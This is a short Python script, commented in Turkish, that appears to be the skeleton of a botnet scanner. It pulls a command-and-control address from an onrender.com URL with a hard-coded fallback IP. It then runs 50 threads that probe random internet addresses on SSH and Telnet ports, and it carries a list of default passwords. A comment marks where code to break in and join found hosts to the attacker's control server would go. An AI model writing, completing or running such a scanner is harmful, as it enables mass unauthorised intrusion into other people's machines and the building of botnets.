import socket, threading, random, requests, time

# SENİN RENDER ADRESİN
RENDER_URL = "https://ordu-1.onrender.com"

def get_target():
    try:
        return requests.get(RENDER_URL).text.strip().split(":")
    except:
        return "34.6.91.209", 1010

def scanner():
    # En kolay düşen şifreler (Sanayi Wordlist)
    passwords = ["admin", "root", "1234", "12345", "password", "123456"]
    
    while True:
        # Rastgele IP üret (Özellikle zayıf ülkelerden başlar)
        ip = f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        
        # Port 23 (Telnet) ve 22 (SSH) denemesi
        for port in [22, 23]:
            s = socket.socket()
            s.settimeout(0.5)
            if s.connect_ex((ip, port)) == 0:
                print(f"[*] Kapı Bulundu: {ip}:{port}")
                # Burada sızma ve senin CNC'ye bağlama kodu çalışır...
            s.close()

# CNC'ye (Cloud Shell) Selam Ver ve Taramaya Başla
cnc_ip, cnc_port = get_target()
print(f"[*] Komutan Bekliyor: {cnc_ip}")
# 50 farklı koldan (thread) tarama yap
for i in range(50):
    threading.Thread(target=scanner).start()
